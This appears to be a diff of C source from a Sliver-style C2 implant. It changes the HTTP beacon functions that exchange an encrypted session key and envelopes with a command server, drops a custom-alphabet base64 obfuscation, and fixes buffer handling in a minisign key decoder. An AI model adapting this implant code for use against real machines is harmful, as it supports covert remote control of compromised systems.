@@ -799,7 +799,7 @@ PENVELOPE HttpRecv
 		goto CLEANUP;
 	}
 
-	pDecodedData = SliverBase64Decode(pResp->pRespData);
+	pDecodedData = Base64Decode(pResp->pRespData);
 	pPlainText = SliverDecrypt(pConfig, pDecodedData);
 	pResult = UnmarshalEnvelope(pPlainText);
 CLEANUP:
@@ -833,7 +833,12 @@ BOOL HttpSend
 
 	if (pEnvelope->pData != NULL) {
 		PrintFormatA("Write Envelope:\n");
-		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
+		if (pEnvelope->pData->cbBuffer > 0x2000) {
+			HexDump(pEnvelope->pData->pBuffer, 0x2000);
+		}
+		else {
+			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
+		}
 	}
 	else {
 		PrintFormatW(L"Write Envelope: []\n");
@@ -851,7 +856,7 @@ BOOL HttpSend
 		goto CLEANUP;
 	}
 
-	lpEncodedData = SliverBase64Encode(pCipherText->pBuffer, pCipherText->cbBuffer);
+	lpEncodedData = Base64Encode(pCipherText->pBuffer, pCipherText->cbBuffer, FALSE);
 	pResp = SendHttpRequest(pHttpClient->pHttpConfig, pHttpClient->pHttpClient, pUri->lpPathWithQuery, "POST", NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
 	if (pResp == NULL || (pResp->dwStatusCode != HTTP_STATUS_OK && pResp->dwStatusCode != HTTP_STATUS_ACCEPTED)) {
 		goto CLEANUP;
@@ -996,14 +1001,14 @@ BOOL HttpStart
 		goto CLEANUP;
 	}
 
-	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
+	lpEncodedSessionKey = Base64Encode(pEncryptedSessionInit, cbEncryptedSessionInit, FALSE);
 	pResp = SendHttpRequest(pHttpClient->pHttpConfig, pHttpClient->pHttpClient, NULL, "POST", NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
 
 	lpRespData = ExtractSubStrA(pResp->pRespData, pResp->cbResp);
-	pDecodedResp = SliverBase64Decode(lpRespData);
+	pDecodedResp = Base64Decode(lpRespData);
 	pSessionId = SliverDecrypt(pConfig, pDecodedResp);
 	memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
 	pConfig->szSessionID[sizeof(pConfig->szSessionID) - 1] = '\0';
@@ -1295,28 +1300,28 @@ CLEANUP:
 	return lpResult;
 }
 
-LPSTR SliverBase64Encode
-(
-	_In_ PBYTE lpInput,
-	_In_ DWORD cbInput
-)
-{
-	LPSTR lpResult = NULL;
-	DWORD cbResult = 0;
-	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
-	DWORD i = 0;
-	DWORD dwPos = 0;
-
-	lpResult = Base64Encode(lpInput, cbInput, TRUE);
-	cbResult = lstrlenA(lpResult);
-	for (i = 0; i < cbResult; i++) {
-		dwPos = StrChrA(szOldCharSet, lpResult[i]) - szOldCharSet;
-		lpResult[i] = szNewCharSet[dwPos];
-	}
-
-	return lpResult;
-}
+//LPSTR SliverBase64Encode
+//(
+//	_In_ PBYTE lpInput,
+//	_In_ DWORD cbInput
+//)
+//{
+//	LPSTR lpResult = NULL;
+//	DWORD cbResult = 0;
+//	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+//	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
+//	DWORD i = 0;
+//	DWORD dwPos = 0;
+//
+//	lpResult = Base64Encode(lpInput, cbInput, TRUE);
+//	cbResult = lstrlenA(lpResult);
+//	for (i = 0; i < cbResult; i++) {
+//		dwPos = StrChrA(szOldCharSet, lpResult[i]) - szOldCharSet;
+//		lpResult[i] = szNewCharSet[dwPos];
+//	}
+//
+//	return lpResult;
+//}
 
 PMINISIGN_PUB_KEY DecodeMinisignPublicKey
 (
@@ -1326,8 +1331,7 @@ PMINISIGN_PUB_KEY DecodeMinisignPublicKey
 	PMINISIGN_PUB_KEY pResult = NULL;
 	LPSTR* pSplittedArray = NULL;
 	DWORD cbSplittedArray = 0;
-	PBYTE pTemp = NULL;
-	DWORD cbTemp = 0;
+	PBUFFER pTemp = NULL;
 	DWORD i = 0;
 
 	pSplittedArray = StrSplitNA(lpInput, "\n", 0, &cbSplittedArray);
@@ -1335,14 +1339,15 @@ PMINISIGN_PUB_KEY DecodeMinisignPublicKey
 		goto CLEANUP;
 	}
 
-	pTemp = Base64Decode(pSplittedArray[1], &cbTemp);
-	if (cbTemp != sizeof(MINISIGN_PUB_KEY)) {
-		FREE(pTemp);
+	pTemp = Base64Decode(pSplittedArray[1]);
+	if (pTemp->cbBuffer != sizeof(MINISIGN_PUB_KEY)) {
 		goto CLEANUP;
 	}
 
-	pResult = (PMINISIGN_PUB_KEY)pTemp;
+	pResult = (PMINISIGN_PUB_KEY)pTemp->pBuffer;
+	pTemp->pBuffer = NULL;
 CLEANUP:
+	FreeBuffer(pTemp);
 	if (pSplittedArray != NULL) {
 		for (i = 0; i < cbSplittedArray; i++) {
 			if (pSplittedArray[i] != NULL) {
